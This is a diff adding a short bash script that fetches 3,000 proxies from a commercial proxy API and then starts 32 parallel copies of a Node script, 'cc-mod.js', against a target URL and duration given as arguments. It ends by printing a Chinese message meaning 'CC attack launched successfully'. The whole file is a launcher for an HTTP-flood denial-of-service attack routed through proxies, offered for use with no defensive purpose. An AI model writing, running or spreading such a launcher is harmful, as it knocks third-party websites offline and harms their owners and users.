@@ -1,0 +1,34 @@
+#!/bin/bash
+curl "http://ent.kdlapi.com/api/getproxy/?orderid=935107534673339&num=3000&protocol=2&method=1&quality=0&sep=1" -o cc.txt &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+echo  'cc攻击发动成功'
